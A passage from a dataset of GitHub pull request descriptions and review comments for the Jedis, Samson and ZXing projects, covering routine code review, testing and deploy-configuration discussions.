make it an inner class then we should see how to test it as it won't be accessible from the tests."", ""I'm OK to leave as it is when we can't find a way to test inner (private) class. \r\nOr we can make class package private and test with same package, but I also think it doesn't look good.\r\n\r\nI'll give it a try some more, and merge as it is if all things seems not good."", '@HeartSaVioR One quick way to test private inner class is by reflection.\r\nIt is impossible to cast instance as `SetFromList`, by casting to `Set` testing itself is possible.\r\n(And yes, it is not so pretty.)\r\n```\r\nConstructor<?> con = Class.forName(""redis.clients.jedis.BinaryJedis$SetFromList"").getDeclaredConstructor(List.class);\r\ncon.setAccessible(true);\r\n\r\nSet cut = (Set)con.newInstance(new ArrayList<String>());\r\n```\r\n\r\nAs @marcosnils said, the collaboratos can review and control PRs, I don\'t think this is necessary.', '@itugs That class can be used outside of Jedis. I talked with Marcos and he agree we would be better to hide class.', ""@itugs Maybe I misunderstood you. We're agreed to hide SetFromList, but test matters now. \r\nIf you mean test is not necessary, I'm OK."", ""@HeartSaVioR OK, then I'll hide `SetFromList` to inside of `BinaryJedis` and fix my test case."", '@HeartSaVioR @marcosnils I move `SetFromList` to inside of BinaryJedis.', '@HeartSaVioR @itugs I like it much better now. LGTM.', ""LGTM, I'll merge it.\r\n@itugs Thanks for your effort!"", 'Thank you!']"
899,xetorthio/jedis,892.0,"A port of #888 based against master, with unit tests. The Cluster unit test utilized static instances, which got wonky. So I setup and tore down the slave in the added test method. ","[""@taer \r\nSo sorry for waiting too long. \r\nWe merged cluster-revised branch to master, so I'd like to take this PR, but needs upmerge.\r\nIf you don't mind, could you do some works to upmerge?"", '@taer can you please rebase?\r\n\r\nThx!.', ""Dropped the readonly command from JedisCluster. It didn't make sense there. This should be good to go now."", 'I agree ClusterCommands seems to be more proper place to readonly(). Thanks @marcosnils!\r\nLooks good to me overall. Thanks @taer!', ""thanks @HeartSaVioR I'll re-run the tests and merge."", 'Merged to 3.0 and 2.7 respectively. Thanks for the contribution @taer ']"
900,zendesk/samson,81.0,"Currently setup instructions are ""read this giant block of config foo""

Now you can just try it out by running 2 scripts, should make getting started much easier.

@steved555 ","['@zendesk/samson ', 'I like this :+1: ']"
901,zendesk/samson,99.0,"@steved555, @dasch, @jwswj, @halcyonCorsair, @princemaple 

Just looking for a simple way to show the deploy buddy on a deploy. 

![2014-09-08 at 3 19 pm](https://cloud.githubusercontent.com/assets/1709515/4193898/cd1fcd22-37a6-11e4-8195-878b2a30c5d3.png)
","['Good to merge?', ':+1: ', 'I gotta wait for one of the 5 guys to give me the +1 according to the rules on the readme before I can merge. ', '@jwswj \r\nThe code looks good to me, was there any discussion about whether we want to display the buddy?', 'Yes, engineers wanted to find out who approved a production deploys.', ':+1: ']"
902,zendesk/samson,76.0,This should resolve #49 ,"['/cc @zendesk/samson ', ""I don't quite like the idea of having to do what you did in the PR every time a deploy is done, but I can't think of an elegant solution right now. @jwswj any idea?"", '@princemaple, why? DB query too expensive for your tastes?', ""The query itself seems OK, but is a little bit too much for every deploy IMO.\r\nIf it's something controlled by me, I'd enforce the users to make a successful deploy before they can check the box, either by policy or programmatically (doing what you do on every deploy on every stage form render, i.e. disabling the checkbox if the condition is not met)"", '@princemaple @jwswj :haircut: ', ""@princemaple I disagree with forcing people to go into the options a second time after they're set up. This is better functionality at the expense of a single db hit per deploy, if it is configured to comment on PRs.\r\n\r\ncc @zendesk/samson can I get a review please?"", 'Looking ok, but a test would be good.', 'add tests', '@sandlerr this is old and needs to be rebased. Going to close for now. Feel free to re-open if you get back to it.']"
903,zendesk/samson,220.0,"I'm sick of having a private version of Samson. This is an attempt to bring anything from our private version of Samson which should be in the public version and extract a few extra configuration options to ENV variables

### TODO
- [x] Squash the history on this branch

cc /@zendesk/samson","["":+1: even if it's a little broken / weird the most important part is that we get one codebase :)"", ""@pswadi-zendesk @steved555 I've cleaned up this branch so it doesn't have 100s of merge commits, plus has the ability to disable authentication options. Can I get a +1?"", ':+1: ', '+1']"
904,zendesk/samson,257.0,"This PR makes Samson soft_delete the locks that a user had put in a stage when that user is soft_deleted.
The current behaviour (the locks being left there) was also causing the main page to return a 500 when a user that had a lock in a stage was deleted, see exception below:

```
ActionView::Template::Error (undefined method `name' for nil:NilClass):
    10:           <li class=""<%= 'locked' if stage.locked? %>"">
    11:             <%= link_to stage.name, project_stage_path(project, stage), class: 'stage-link' %>
    12:             <%= content_tag :span, 'Deploying', class: 'label label-primary' if stage.currently_deploying? %>
    13:             <%= content_tag :i, '', class: 'fa fa-lock', title: stage.lock.summary if stage.locked? %>
    14:
    15:             <div class=""pull-right"">
    16:               <% if stage.last_deploy.try(:failed?) %>
```

In line 13, ```stage.lock.summary``` would internally call ```user.name```, but if the user is soft deleted, we would be calling the ```name``` method on ```nil```.

/cc @zendesk/samson @steved555 @grosser @jonmoter

### References
 - Jira link: [INFR-1018](https://zendesk.atlassian.net/browse/INFR-1018)

### Risks
 - None","['is this PR to remedy this ticket: https://zendesk.atlassian.net/browse/INFR-1018\r\n\r\nif yes, please reference this ticket.', 'yes it is\n\non top of this change we should probably also do a user.try(:name) ||\n""UNKNOWN USER"" as before, the fix I did was to fix nils, but does not take\ncare of not founds\n\nOn Tue, Mar 3, 2015 at 11:18 AM, Paul Deuter <notifications@github.com>\nwrote:\n\n> is this PR to remedy this ticket:\n> https://zendesk.atlassian.net/browse/INFR-1018\n>\n> if yes, please reference this ticket.\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/zendesk/samson/pull/257#issuecomment-77014167>.\n>\n', '@grosser \r\nUpdated the User to contain the  ```has_many:  :locks, dependent: :destroy```. I had no idea that the soft_delete gem would trigger the cascade soft_deletion if ```dependent: :destroy``` was set. It is nice that it does.', ':+1: ']"
905,zendesk/samson,302.0,"/cc @zendesk/runway 

### Risks
 - None","['There we go, @grosser, better?', ':+1: ']"
906,zendesk/samson,317.0,"Regenerate schema.rb file to allow for less diffs when adding future migrations. Rails 4 changed some of the formatting for it.
I also ran into missing migrations, so I fixed/added those.

/cc @zendesk/runway @samson

### References
 - Jira link:

### Risks
 - None","['Added rule to pickup plugin migrations as well. Thanks @sandlerr ', 'ping @zendesk/runway @zendesk/samson', ':+1: ', ':+1:']"
907,zendesk/samson,338.0,"Every 5 seconds, poll to check the current deploy status and update the
number next to the current deploys link. If there are any active deploys
then also pulsate the number on the badge to indicate there is some
activity.

Here is a gif showing how it works:

![current_deploys_feature](https://cloud.githubusercontent.com/assets/112153/7040337/9b909cb8-de00-11e4-995a-887c922e7ff4.gif)
","[""It actually pulsates a bit slower than in the video, takes 6 seconds. I purposely chose a high value so it wouldn't be too annoying."", ':+1: cc @zendesk/samson @zendesk/runway ', '@princemaple cool, have addressed those in an amended commit, can you take another look when you have a spare moment please.', 'Thanks a lot for the effort @mariovisic !\r\n@sandlerr leaving this to you.', 'Extra points if you can live update the status in the Releases tab!', '@dasch I can have a go at that after this gets merged in, I have some time tomorrow.', ""Nice! I'd been looking at using websockets to solve this question recently (#339), but can combine with the pulsing if we ever incorporate websocket usage! :)\r\n"", 'Thanks @mariovisic :cool: ', 'top work @mariovisic :)', ':heart: ']"
908,zendesk/samson,416.0,"The Build models will be used to associate Docker builds with a given Github SHA.
The BuildStatus class will be used when running tests or analysis on that build, such as Code Climate, Travis, Jenkins, and possibly Canary runs.

/cc @zendesk/runway 

### Risks
 - new code, minimal risk","[""'Build' seems a bit ambiguous ... otherwise :+1: "", 'If a ""Build"" is the primary association on for updating a ""Status"", I\'d rather it not be exclusive to Containers. I\'d like to be able to have a Status API for traditional `cap` deploys.', 'Code updated to reflect suggestions and comments.', ':+1: ']"
909,zendesk/samson,403.0,"To further the integration of deploy groups, this passes down the list of affected deploy_groups in an environment variable $DEPLOY_GROUPS so the script can access it.

![screen shot 2015-05-08 at 15 05 18](https://cloud.githubusercontent.com/assets/515143/7537889/fce5c204-f593-11e4-9c65-c93c2a7f1684.png)

----------------------

![pod1_deploy__succeeded__-_project0](https://cloud.githubusercontent.com/assets/515143/7537890/fe9d44e6-f593-11e4-9232-8dd6a3bdd49d.png)


/cc @zendesk/runway @zendesk/samson 

### References
 - Jira link:

### Risks
 - None","[""don't they need to be lowercase to be used in cap ?"", ':+1: except for the also exporting empty', ""@grosser , yes, but I figure the script can take care of lowercasing them. Didn't want to change the case if someone else besides Zendesk needs it to exact match the DeployGroup name.\r\n\r\nSo they would use:\r\n```\r\nPODS = `echo $DEPLOY_GROUPS | awk '{print tolower($0)}'`\r\ncap $PODS deploy\r\n```"", 'hmm technically more correct, but a bit messy ... we can just change our deploy groups to be lowercase I guess.', ""Hey @henders, can you remind me of the use case for this? I know we spoke about it at some point, but I've forgotten how this will be used."", ""@jonmoter \r\nIt's integrating DeployGroup functionality further into Samson. At the moment it's just visual fluff, but this change allows the stage to just do 'cap $DEPLOY_GROUPS deploy' instead of enumerating the deploy groups manually when they've already ticked the appropriate deploy group boxes."", '@zendesk/runway @grosser \r\nLooking for another +1 on this since I refactored some code which still looks a bit off.', ""we'll have to change our names deploy group names to lowercase to be able to use them with cap then or lowercase them in cap ?"", 'We could leave it to the command to do any translation necessary: http://stackoverflow.com/a/2264537/119479 - janky, but flexible.\r\n\r\nAlternatively, we could introduce this concept within the `HostGroup` model as a value that can be explicitly defined.', 'meh just renaming them seems easier :)\n\nOn Thu, May 21, 2015 at 3:36 PM, Gabe Martin-Dempesy <\nnotifications@github.com> wrote:\n\n> We could leave it to the command to do any translation necessary:\n> http://stackoverflow.com/a/2264537/119479 - janky, but flexible.\n>\n> Alternatively, we could introduce this concept within the HostGroup model\n> as a value that can be explicitly defined.\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/zendesk/samson/pull/403#issuecomment-104441131>.\n>\n', '@grosser - addressed comments!', ':+1: ']"
910,zendesk/samson,397.0,"@jonmoter simple env plugin to kick things of ... not sure if .env is the best file to use, but it kind of makes sense ...

@steved thoughts ?

### Risks
 - None
","['![screen shot 2015-05-06 at 10 41 29 am](https://cloud.githubusercontent.com/assets/11367/7499438/7ecffe74-f3dc-11e4-8be4-304b337c618e.png)\r\n', 'What are you going to put in here?\r\nHow do we handle sharing of configuration changes among different applications?', ""For starters I think public configuration only, later maybe secret things but only via indirection (look it up in secret-store under key xyz) or via some acl system ...\r\n\r\nTo get shared configuration we'd need something like the stage/command building thing, but I'm trying to keep it simple for now since I'm not even sure if we end up using this."", ""So then what benefits does this have over keeping it in the repo? At least it's versioned there."", ""Good point, for different stages and .env.staging etc would also work.\r\n\r\nBenefits would be:\r\n - (later) reuse of configuration across projects (might also be possible on project level ...)\r\n - not adding staging/production config to projects\r\n - quick change without committing new code\r\n\r\nDownsides:\r\n - env is unversioned\r\n - env might drift from what the project needs to be run\r\n - env might need to keep in sync with project version\r\n\r\nso yeah not a clear winner ... for samson itself it would be nice since we deploy a project we cannot put secrets or specific configs into ... but that's also fixable via other ways ..."", ""I'm really hoping we will allow deployers to configure the environment, not just admins\r\n\r\nedit: sorry, my comment relates more to application runtime environment than deploy-time. Maybe its fine for this to be controlled by admins."", ""edit is restricted to admins, so that won't work :)\r\nstill better than going through ops ..."", ""Yeah, there are a few problems with this approach.\r\n\r\n1. No way to share config across projects (e.g. Airbrake API key, redis hosts, etc.)\r\n2. Shouldn't use for secrets\r\n3. No way to have different config for each pod. Several projects have a single stage for deploying to multiple pods, and something like the DATABASE_URL will have a different value for each of the pods. So you can't have a single .env file that will work across multiple pods.\r\n\r\nEspecially due to point 3, I'm skeptical about getting this ENV management in Samson to play nicely with Capistrano deploys. It's necessary for docker deploys, but I haven't yet found an elegant way to do that with cap deploys."", 'Sharing is easily added by copying the way we do deploy scripts.\nDoing service discovery from a remote pod seems problematic to me  (samson\n-> pod1/2/3/4) -> leave it to the runner ?\nSecrets could be more like instructions ""Lookup key xyz in secret store""\nand be executed by the runner.\nSince that moves a bunch of logic to the runner anyway we might as well\ncheck in the list of required env vars and let the runner build it.\n\nOn Thu, May 7, 2015 at 1:54 AM, Jon Moter <notifications@github.com> wrote:\n\n> Yeah, there are a few problems with this approach.\n>\n>    1. No way to share config across projects (e.g. Airbrake API key,\n>    redis hosts, etc.)\n>    2. Shouldn\'t use for secrets\n>    3. No way to have different config for each pod. Several projects have\n>    a single stage for deploying to multiple pods, and something like the\n>    DATABASE_URL will have a different value for each of the pods. So you can\'t\n>    have a single .env file that will work across multiple pods.\n>\n> Especially due to point 3, I\'m skeptical about getting this ENV management\n> in Samson to play nicely with Capistrano deploys. It\'s necessary for docker\n> deploys, but I haven\'t yet found an elegant way to do that with cap deploys.\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/zendesk/samson/pull/397#issuecomment-99779721>.\n>\n', 'also added ENV.json support so we can play with it / use it now.\r\n\r\n![screen shot 2015-05-08 at 11 51 45 am](https://cloud.githubusercontent.com/assets/11367/7543368/a27f9af8-f578-11e4-98e4-b393380290ab.png)\r\n', 'added support for groups\r\n\r\n![screen shot 2015-05-27 at 3 37 52 pm](https://cloud.githubusercontent.com/assets/11367/7850055/97141d88-0491-11e5-9856-833a7cd4d7c6.png)\r\n![screen shot 2015-05-27 at 3 35 20 pm](https://cloud.githubusercontent.com/assets/11367/7850056/9ba7fb6c-0491-11e5-86c1-b1f18dee818a.png)\r\n![screen shot 2015-05-27 at 4 57 48 pm](https://cloud.githubusercontent.com/assets/11367/7850061/a3b64d68-0491-11e5-93fa-ed117492a9b5.png)\r\n\r\nproduces ENV.json + ENV.podx.json for each deploy group of the stage\r\n\r\nstill need more tests, but looks good ?\r\n', 'added tests\r\n\r\nlooking good ?', 'The Environment Group pages look cool. :)\r\n\r\nFor the stage edit the textarea env config now looks odd in comparison, and IMO the table based approach on the manage groups page looks better. Can you re-use the same UI component for the group inside the stage-edit?', 'Oh yea, another advantage of using the HABTM relationship between groups and stages is you can easily do the reverse lookup to see what stages are related to a particular group. (nice to show that if editing a group).', ""Yeah at the end it felt weird to have 2 different interfaces, I'll turn\nthat into a table too\n\nOn Thu, May 28, 2015 at 6:03 AM, Shane Hender <notifications@github.com>\nwrote:\n\n> The Environment Group pages look cool. :)\n>\n> For the stage edit the textarea env config now looks odd in comparison,\n> and IMO the table based approach on the manage groups page looks better.\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/zendesk/samson/pull/397#issuecomment-106302861>.\n>\n"", 'Can also do that without, just needs another has_many :stages, through :)\n\nOn Thu, May 28, 2015 at 8:08 AM, Shane Hender <notifications@github.com>\nwrote:\n\n> Oh yea, another advantage of using the HABTM relationship between groups\n> and stages is you can easily do the reverse lookup to see what stages are\n> related to a particular group. (nice to show that if editing a group).\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/zendesk/samson/pull/397#issuecomment-106388242>.\n>\n', 'New index page with stages\r\n![screen shot 2015-05-28 at 1 48 34 pm](https://cloud.githubusercontent.com/assets/11367/7870791/5e9edcfe-0540-11e5-9972-1ec374cd469b.png)\r\n\r\nNew stage ui with table:\r\n![screen shot 2015-05-28 at 1 50 09 pm](https://cloud.githubusercontent.com/assets/11367/7870804/7dedc1ec-0540-11e5-9b99-75a6bdb58a11.png)\r\n\r\nand generating .env files for all deploy groups\r\n\r\nit no longer merges them with the existing settings but blows up if you did not specify all required keys + ignores keys that were not specified + does nothing if no variables were added in the UI\r\n\r\nany concerns still remaining ?', 'Later this can set consul keys or whatever instead of writing these ENV.json files, but that should be easy ...', ""This looks good to me. Let's merge it, play around with it some, and see what works about it, and what we want to tweak.\r\n\r\n:+1: "", ""I'll get rosetta converted ... let's see if that works fine :)""]"
911,zendesk/samson,468.0,"Hi,

Currently the `on_completed` hook is invoke before the output is stored. Therefore, it makes subscribers have no way to access the log, such as emailing it out(nicer than viewer it in the app). This change move it down after we store log output.

cc @zendesk/runway","['Hi @grosser \r\n\r\nThis is a minor change and not sure if my approaching is good. Basically I want to have access to the output in `after_deploy` hook. Is this a good way? \r\n\r\n', 'that looks good ... I think this was broken by a recent refactor ... can you add a test to document the way it is supposed to work ?\r\n\r\nBtw are you working on a plugin / care to link it in the Readme /', 'looks good :)', ""@grosser I add 2 test cases:\r\n\r\n- test call subscriber (I don't see us test it yet)\r\n- test that once subscriber is invoked, the output should be stored in `job` object(in other word, job's record in database)\r\n\r\nI refactor `execute_job` a bit so I can easily pass a block as a subscriber. 2/3 build is passed, one failed. I'm trying to rebuild.\r\n\r\nAnd Yes, I'm working on simple plugin to email out the log of output. Nothing fancy but will add in readme once I'm done.\r\n\r\n"", '@grosser Hey, the build is passed. Any chance this can be merged?', '@grosser I updated one line `do` block to curly lambda(is it correct, btw?) and rebase to current master', ':+1: ']"
912,zendesk/samson,501.0,@zendesk/runway @grosser for use in private plugin,"['@grosser updated', ':+1: ']"
913,zxing/zxing,135.0,"When another app calls zxing via IntentIntegrator, it can request a particular camera to recognize barcodes from, as opposed to the default camera picked by zxing.","['You just push an additional commit to this branch with additional changes. They are all squashed before being merged anyway.', ""Looking good, thank you. I'll merge this and test the normal case. I assume this is already something that works for your use case.\r\n\r\nIf you want, add yourself to AUTHORS in this commit too, or I'll do it later. I think it is non-trivial."", ""Yes, I hope this works for our case, too, and that I understood the code properly and there are no more places to amend. Full test for us would be installing our app and making sure it fetches the new version from app store and triggers the front camera, so looking forward to being able to do that. Please feel free to amend authors as you see fit, I'd personally describe my changes as minuscule :)""]"
